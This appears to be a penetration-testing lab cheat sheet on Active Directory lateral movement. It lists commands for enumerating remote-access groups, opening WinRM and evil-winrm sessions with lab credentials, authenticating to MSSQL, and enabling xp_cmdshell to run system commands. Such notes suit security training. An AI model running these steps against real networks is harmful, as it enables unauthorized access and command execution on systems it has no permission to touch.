### **Remote Desktop**
1. Enumerating the Remote Desktop Users Group: `Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"`
2. Enumerating the Remote Management Users Group: `Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"`
3. Establishing WinRM Session from Windows:
    1. `$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force`
    2. `$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)`
    3. `Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred`
4. Connecting to a Target with Evil-WinRM and Valid Credentials: `evil-winrm -i 10.129.201.234 -u forend`
### **SQL Server Admin**
1. Enumerating MSSQL Instances with PowerUpSQL: 
    1. `cd .\PowerUpSQL\`
    2. `Import-Module .\PowerUpSQL.ps1`
    3. `Get-SQLInstanceDomain`
2. Authenticate against the remote SQL server host and run custom queries or operating system commands: `Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'`
3. Authenticate from our Linux attack host using mssqlclient.py from the Impacket toolkit: `mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth`
4. Viewing our Options with Access to the SQL Server: `SQL> help`
5. Choosing enable_xp_cmdshell: `SQL> enable_xp_cmdshell`
6. Enumerating our Rights on the System using xp_cmdshell: `xp_cmdshell whoami /priv`